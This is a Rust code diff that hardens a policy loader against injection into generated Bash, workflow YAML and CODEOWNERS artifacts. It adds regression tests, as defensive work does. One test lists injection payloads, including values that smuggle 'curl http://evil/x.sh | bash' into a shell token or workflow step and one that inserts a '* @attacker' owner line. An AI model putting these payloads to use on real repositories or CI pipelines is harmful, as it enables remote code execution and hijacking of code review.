@@ -44,17 +44,44 @@ pub enum PolicyError {
         source: globset::Error,
     },
 
-    /// A declared value carries a newline or control character that would inject
-    /// extra lines into the emitted `.gitattributes` block (a `source` like
-    /// `"schema.json\n* filter=smudge"` would write an unrelated git attribute).
-    #[error("unsafe value in {field}: must not contain newline or control characters")]
+    /// A declared value contains syntax that could escape its generated-artifact
+    /// context and change executable workflow or CODEOWNERS behavior.
+    #[error("unsafe value in {field}: contains characters unsafe for generated artifacts")]
     UnsafeValue { field: &'static str },
 }
 
-/// Reject a value that would break out of its line when written to a generated
-/// artifact's `.gitattributes` entry or provenance header.
+/// Reject controls that could add lines or non-printing syntax to a generated
+/// artifact.
 fn reject_unsafe(field: &'static str, value: &str) -> Result<(), PolicyError> {
     if value.chars().any(char::is_control) {
+        return Err(PolicyError::UnsafeValue { field });
+    }
+    Ok(())
+}
+
+/// Reject characters that can terminate or expand a single-quoted Bash token.
+fn reject_shell_unsafe(field: &'static str, value: &str) -> Result<(), PolicyError> {
+    reject_unsafe(field, value)?;
+    if value
+        .chars()
+        .any(|character| matches!(character, '\'' | '"' | '`' | '$' | '\\'))
+    {
+        return Err(PolicyError::UnsafeValue { field });
+    }
+    Ok(())
+}
+
+/// CODEOWNERS separates patterns from owners with whitespace, so allowing it
+/// inside an operator-supplied pattern would permit extra owner declarations.
+fn reject_codeowners_unsafe(field: &'static str, value: &str) -> Result<(), PolicyError> {
+    reject_unsafe(field, value)?;
+    let unsupported_pattern = value.is_empty()
+        || value.starts_with('#')
+        || value.starts_with("\\#")
+        || value
+            .chars()
+            .any(|character| matches!(character, '!' | '[' | ']'));
+    if value.chars().any(char::is_whitespace) || unsupported_pattern {
         return Err(PolicyError::UnsafeValue { field });
     }
     Ok(())
@@ -156,6 +183,7 @@ impl Policy {
     pub fn compile(&self) -> Result<CompiledPolicy, PolicyError> {
         let mut builder = globset::GlobSetBuilder::new();
         for pattern in &self.protected_paths {
+            reject_shell_unsafe("protected_paths", pattern)?;
             let glob = globset::Glob::new(pattern).map_err(|source| PolicyError::Glob {
                 field: "protected_paths",
                 glob: pattern.clone(),
@@ -181,6 +209,9 @@ impl Policy {
                 glob: entry.glob().to_string(),
                 source,
             })?;
+        }
+        for module in &self.gateway_allowlist {
+            reject_codeowners_unsafe("gateway_allowlist", module)?;
         }
         Ok(CompiledPolicy { protected })
     }
@@ -303,6 +334,73 @@ generated_paths:
                 field: "generated_paths glob"
             }
         ));
+    }
+
+    #[test]
+    fn policy_artifact_injection_payloads_are_rejected_at_load() {
+        let payloads = [
+            "a' ; curl http://evil/x.sh | bash ; '",
+            "safe/**\n      - name: Injected\n        run: curl http://evil/x.sh | bash",
+            "m.rs @owners\n* @attacker",
+        ];
+
+        for field in ["protected_paths", "gateway_allowlist"] {
+            for payload in payloads {
+                let escaped = payload
+                    .replace('\\', "\\\\")
+                    .replace('"', "\\\"")
+                    .replace('\n', "\\n");
+                let yaml = format!("{field}: [\"{escaped}\"]");
+                let err = Policy::from_yaml(&yaml).unwrap_err();
+                assert!(
+                    matches!(err, PolicyError::UnsafeValue { field: actual } if actual == field),
+                    "{field} accepted artifact-injection payload {payload:?}: {err}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn protected_paths_reject_shell_metacharacters() {
+        for character in ['\'', '"', '`', '$', '\\'] {
+            let value = format!("safe{character}path")
+                .replace('\\', "\\\\")
+                .replace('"', "\\\"");
+            let yaml = format!("protected_paths:\n  - \"{value}\"");
+            let err = Policy::from_yaml(&yaml).unwrap_err();
+            assert!(
+                matches!(
+                    err,
+                    PolicyError::UnsafeValue {
+                        field: "protected_paths"
+                    }
+                ),
+                "protected_paths accepted shell metacharacter {character:?}: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn gateway_allowlist_rejects_controls_and_unsupported_codeowners_patterns() {
+        for yaml_value in [
+            "#gateway.rs",
+            "!gateway.rs",
+            "[ab]gateway.rs",
+            "gateway\\0.rs",
+            "gateway\\u001b.rs",
+        ] {
+            let yaml = format!("gateway_allowlist: [\"{yaml_value}\"]");
+            let err = Policy::from_yaml(&yaml).unwrap_err();
+            assert!(
+                matches!(
+                    err,
+                    PolicyError::UnsafeValue {
+                        field: "gateway_allowlist"
+                    }
+                ),
+                "gateway_allowlist accepted invalid CODEOWNERS pattern {yaml_value:?}: {err}"
+            );
+        }
     }
 
     #[test]
